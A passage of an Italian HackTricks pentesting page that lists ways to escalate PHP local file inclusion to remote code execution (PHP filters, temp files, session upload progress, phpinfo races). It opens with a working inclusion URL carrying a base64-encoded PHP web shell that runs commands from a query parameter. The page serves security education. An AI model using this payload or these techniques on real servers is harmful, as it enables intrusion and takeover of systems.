http://example.com/index.php?page=PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.php

NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
### Attraverso i filtri php (nessun file necessario)

Questo [**articolo**](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d) spiega che √® possibile utilizzare **filtri php per generare contenuti arbitrari** in output. Ci√≤ significa essenzialmente che √® possibile **generare codice php arbitrario** per l'inclusione **senza la necessit√† di scriverlo** in un file.

{% content-ref url="lfi2rce-via-php-filters.md" %}
[lfi2rce-via-php-filters.md](lfi2rce-via-php-filters.md)
{% endcontent-ref %}

### Attraverso segmentation fault

**Carica** un file che verr√† memorizzato come **temporaneo** in `/tmp`, quindi nella **stessa richiesta,** provoca un **segmentation fault**, e quindi il **file temporaneo non verr√† eliminato** e potrai cercarlo.

{% content-ref url="lfi2rce-via-segmentation-fault.md" %}
[lfi2rce-via-segmentation-fault.md](lfi2rce-via-segmentation-fault.md)
{% endcontent-ref %}

### Attraverso lo storage temporaneo dei file di Nginx

Se hai trovato una **Inclusione di File Locale** e **Nginx** √® in esecuzione davanti a PHP, potresti essere in grado di ottenere RCE con la seguente tecnica:

{% content-ref url="lfi2rce-via-nginx-temp-files.md" %}
[lfi2rce-via-nginx-temp-files.md](lfi2rce-via-nginx-temp-files.md)
{% endcontent-ref %}

### Attraverso PHP\_SESSION\_UPLOAD\_PROGRESS

Se hai trovato una **Inclusione di File Locale** anche se non hai una sessione e `session.auto_start` √® `Off`. Se fornisci il **`PHP_SESSION_UPLOAD_PROGRESS`** nei dati **multipart POST**, PHP **abilita la sessione per te**. Potresti abusare di questo per ottenere RCE:

{% content-ref url="via-php_session_upload_progress.md" %}
[via-php\_session\_upload\_progress.md](via-php\_session\_upload\_progress.md)
{% endcontent-ref %}

### Attraverso caricamenti di file temporanei in Windows

Se hai trovato una **Inclusione di File Locale** e il server √® in esecuzione su **Windows** potresti ottenere RCE:

{% content-ref url="lfi2rce-via-temp-file-uploads.md" %}
[lfi2rce-via-temp-file-uploads.md](lfi2rce-via-temp-file-uploads.md)
{% endcontent-ref %}

### Attraverso phpinfo() (file\_uploads = on)

Se hai trovato una **Inclusione di File Locale** e un file che espone **phpinfo()** con file\_uploads = on puoi ottenere RCE:

{% content-ref url="lfi2rce-via-phpinfo.md" %}
[lfi2rce-via-phpinfo.md](lfi2rce-via-phpinfo.md)
{% endcontent-ref %}

### Attraverso compress.zlib + `PHP_STREAM_PREFER_STUDIO` + Rivelazione del percorso

Se hai trovato una **Inclusione di File Locale** e **puoi esfiltrare il percorso** del file temporaneo MA il **server** sta **controllando** se il **file da includere ha marcature PHP**, puoi provare a **bypassare quel controllo** con questa **Condizione di Gara**:

{% content-ref url="lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md" %}
[lfi2rce-via-compress.zlib-+-php\_stream\_prefer\_studio-+-path-disclosure.md](lfi2rce-via-compress.zlib-+-php\_stream\_prefer\_studio-+-path-disclosure.md)
{% endcontent-ref %}

### Attraverso attesa eterna + forza bruta

Se puoi abusare dell'Inclusione di File Locale per **caricare file temporanei** e far **bloccare** l'esecuzione PHP del server, potresti quindi **forzare i nomi dei file per ore** per trovare il file temporaneo:

{% content-ref url="lfi2rce-via-eternal-waiting.md" %}
[lfi2rce-via-eternal-waiting.md](lfi2rce-via-eternal-waiting.md)
{% endcontent-ref %}

### Verso Errore Fatale

Se includi uno qualsiasi dei file `/usr/bin/phar`, `/usr/bin/phar7`, `/usr/bin/phar.phar7`, `/usr/bin/phar.phar`. (Devi includere lo stesso due volte per generare quell'errore).

**Non so quanto possa essere utile ma potrebbe esserlo.**\
_Anche se causi un Errore Fatale di PHP, i file temporanei di PHP caricati vengono eliminati._

<figure><img src="../../.gitbook/assets/image (1031).png" alt=""><figcaption></figcaption></figure>

## Riferimenti

* [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal)\\
* [PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders)

{% file src="../../.gitbook/assets/EN-Local-File-Inclusion-1.pdf" %}

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

Unisciti al [**server Discord di HackenProof**](https://discord.com/invite/N3FrSbmwdy) per comunicare con hacker esperti e cacciatori di bug!

**Approfondimenti sull'Hacking**\
Coinvolgiti con contenuti che esplorano l'emozione e le sfide dell'hacking

**Notizie sull'Hacking in Tempo Reale**\
Resta aggiornato con il mondo dell'hacking ad alta velocit√† attraverso notizie e approfondimenti in tempo reale

**Ultime Annunci**\
Rimani informato sui nuovi bug bounty in arrivo e sugli aggiornamenti cruciali della piattaforma

**Unisciti a noi su** [**Discord**](https://discord.com/invite/N3FrSbmwdy) e inizia a collaborare con i migliori hacker oggi!

<details>

<summary><strong>Impara l'hacking AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusivi [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos di github.

</details>
